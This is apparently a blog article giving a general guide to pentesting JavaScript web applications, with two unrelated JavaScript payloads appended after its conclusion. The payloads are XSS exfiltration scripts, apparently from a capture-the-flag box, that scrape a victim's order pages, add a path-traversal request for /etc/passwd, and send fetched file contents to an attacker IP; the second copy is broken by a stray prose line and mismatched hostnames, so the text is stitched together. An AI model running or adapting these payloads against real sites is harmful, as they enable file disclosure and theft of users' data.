
A Pentester's Guide to JavaScript Apps
by Gilad David Maayan

JavaScript is a programming language that began as a simple mechanism for adding logic and interactivity to a web browser. In the past two decades, it became a browser-based programming standard, replacing many other competing languages and technologies, and becoming the primary language for building client-side interfaces in the digital era. 

JavaScript can be used as a tool for cyber security, penetration testing as well as digital forensic investigations.

Penetration testing attempts to simulate the actions a malicious attacker would take to compromise a system or entity. A penetration tester ethically penetrates a system to identify security weaknesses and vulnerabilities. An important function of penetration testers is not just to identify weaknesses and exploit paths but also to provide remediation guidance. 

Penetration testers can gain unique insights about the design, intended use cases, and implementation of a system under test. These insights help them discover vulnerabilities, prove they can be exploited, and then report them to customers. 

Penetration testing usually occurs at the end of the software development lifecycle (SDLC), so it is usually the last chance to find a vulnerability before release. Penetration testing combined with a robust DevSecOps program adds another layer of detection and remediation.

Is JavaScript Secure? 
Like most programming languages, JavaScript has its share of security exploits and vulnerability exposures. JavaScript vulnerabilities allow attackers to manipulate, modify, or steal data and redirect sessions. While JavaScript is most common for client-side applications, JavaScript vulnerabilities can also create security issues in a server-side environment.

Attack vectors

The main attack vectors exploiting JavaScript vulnerabilities are malicious script execution, user session data theft, local browser storage data theft, source code vulnerability exploitation, tricking users into performing malicious actions, and malicious JavaScript file uploads.

Malicious actors often exploit a combination of vulnerabilities in the application’s source code and other JavaScript security gaps. Unfortunately, one JavaScript obfuscation is not enough to hide or prevent these vulnerabilities. 

JavaScript is an interpreted language (not compiled), making it difficult to prevent hackers from examining application code. Obfuscation remains important because it slows down attackers and attempts at reverse engineering, but it should complement additional security measures. 

Public software packages

A major source of security gaps in source code is the use of public libraries and packages. The NPM library, a major JavaScript player, offers over a million packages. The variety of packages available is an advantage, but it also increases the risk of installing packages with hidden vulnerabilities into web applications.

Many developers install packages for simple tasks, creating more dependencies in the project and introducing security issues. Using many packages also has other consequences.

Input validation

Development teams should ensure that all input supplied by the browser is validated where possible and does not contain unexpected characters. For example, phone number fields must only contain numbers and dashes or parentheses—if an input contains other characters, the controls should reject it automatically. Teams can set up filters to identify allowed characters and reject anything that deviates from the allowlist.

Hackers can use specialized tools to bypass validations on the client side and send unverified and potentially malicious data straight to the server. Without further validation on the server side, attackers could corrupt or replace stored data with false data.

How to Perform a Web Application Pentest
1. Planning Phase
During the planning phase, many important decisions are made that directly affect other phases of penetration testing. This includes defining and agreeing on the scope, schedule, and stakeholders that need to be involved.

When defining the scope of a security assessment, there are various factors to consider before proceeding to the next testing phase—which application pages should be tested and whether to run internal tests, external tests, or both.

It is also important to define a schedule for the entire process. This eliminates the need for lengthy evaluations and allows timely implementation of security controls to better protect your applications.

2. Pre-Attack Phase
At this stage, the pentester carries out reconnaissance to lay the groundwork for testing in the next stage. In particular, this includes finding open source intelligence (OSINT) or other publicly available information that could be used against the web application.

During this phase, the pentester can gather information using techniques like port scanning, service discovery, and vulnerability scanning. This can be done using tools like Nmap, Shodan, Google Dorking, and dnsdumpster.

An important part of reconnaissance is understanding whether employees of the organization are present on social networks. This provides opportunities for social engineering. Hackers can trick employees into providing passwords or other sensitive information, and penetration testers should attempt the same methods to penetrate a secure web application.

3. Attack Phase
During the attack phase, penetration testers attempt to exploit vulnerabilities they discovered. They want to go one step further by identifying and mapping attack vectors.

During the attack phase, the penetration tester attempts to compromise the web application or its host server by penetrating its internal structure. Common attack vectors are phishing, exploitation of web application vulnerabilities such as the OWASP Top 10, and specific exploits targeted at software or operating system vulnerabilities on the web server.

4. Post-Attack Phase
Upon completion of the penetration test, a full detailed report is generated. This report may vary depending on the organization or the type of web application tested.

However, penetration testing reports typically include a list of vulnerabilities, analysis of the results, suggested remedial actions, and conclusions. In addition to this, penetration testers are also responsible for restoring system and network configurations to their original state in the post-attack phase.

Conclusion
In this article, I explained the main threats facing JavaScript-based web applications, and provided a four-step process for carrying out a pentest against a web app:

Planning phase - identifying project scope and schedule.
Pre-attack phase - carrying out reconnaissance to identify vulnerabilities in the application and opportunities for social engineering.
Attack phase - exploiting vulnerabilities such as OWASP Top 10 or specific web server and OS vulnerabilities.
Post-attack phase - generating a full report to help the organization identify and remediate vulnerabilities.
I hope this will be useful as you plan your next web application penetration test.




//
//

function getOrder(html_page) {
    const parser = new DOMParser();
    const htmlString = html_page;
    const doc = parser.parseFromString(htmlString, 'text/html');
    const orderLinks = doc.querySelectorAll('tbody a');
    const orderUrls = Array.from(orderLinks).map((link) => link.getAttribute('href'));
    return orderUrls;
}
function getDownload(html) {
    const container = document.createElement('div');
    container.innerHTML = html;
    const downloadLink = container.querySelector('a[href^="/download"]');
    const downloadURL = downloadLink ? downloadLink.href.substring(0, downloadLink.href.lastIndexOf("=") + 1) + ".&bookIds=../../../../../../etc/passwd" : null;
    return downloadURL;
}
function arrayBufferToBase64( buffer ) {
    var binary = '';
    var bytes = new Uint8Array( buffer );
    var len = bytes.byteLength;
    for (var i = 0; i < len; i++) {
        binary += String.fromCharCode( bytes[ i ] );
    }
    return btoa( binary );
}
function sendrequest(url) {
    var attacker = "http://10.10.14.103/?url=" + encodeURIComponent(url);
    fetch(url).then(async res => {
        fetch(attacker + "&data=" + arrayBufferToBase64(await res.arrayBuffer()))
    });
}
async function getPdf(url) {
    const response = await fetch(url);
    const html = await response.text();
    const download = getDownload(html);
    if (download) {
        sendrequest(download);
    }
}
fetch("http://thing.edu/profile").then(async (res) => {
    const html = await res.text();
    const orders = getOrder(html);
    for (const path of orders) {
        const url = "http://thing.edu" + path;
        getPdf(url);
    }
});

//
//
//

function get_orders(html_page){
 // Create a new DOMParser instance
 const parser = new DOMParser();
 // HTML string to be parsed
 const htmlString = html_page;
 // Parse the HTML string
 const doc = parser.parseFromString(htmlString, 'text/html');
 // Find all the anchor tags within the table body
 const orderLinks = doc.querySelectorAll('tbody a');
 // Extract the URLs and store them in an array
 const orderUrls = Array.from(orderLinks).map((link) =>
link.getAttribute('href'));
 // Returns an array of paths to orders
 return orderUrls;
}
function getDownloadURL(html) {
 // Create a temporary container element to parse the HTML
 const container = document.createElement('div');
 container.innerHTML = html;
 // Use querySelector to select the download link element
 const downloadLink = container.querySelector('a[href^="/download"]');
 // Extract the download URL
 const downloadURL = downloadLink ? downloadLink.href : null;
 // Return a complete url to fetch the download item
 return downloadURL;
}
function fetch_url_to_attacker(url){
 var attacker = "http://<your server ip>:8000/?url=" + encodeURIComponent(url);
Again, I upload this scirpt to my avatar, and poison the note with XSS, and wait for requests to
come to my server.
 fetch(url).then(
 async response=>{
 fetch(attacker, {method:'POST', body: await response.arrayBuffer()})
 }
 );
}
function get_pdf(url){
 // will fetch the PDF (takes the downloadURL as argument) and send its content to
my server
 fetch(url).then(
 async response=>{
 fetch_url_to_attacker(getDownloadURL(await response.text()));
 })
}
// First request for debugging to make sure the script is running
fetch("http://<you server ip>:8000/?trying")
// Now fetch content
fetch("http://thing.edu/profile").then(
 async response=>{
 for (const path of get_orders(await response.text())){
 fetch_url_to_attacker("http://yawn.edu" + path);
 get_pdf("http://yawn.edu" + path);
 }
 }
)
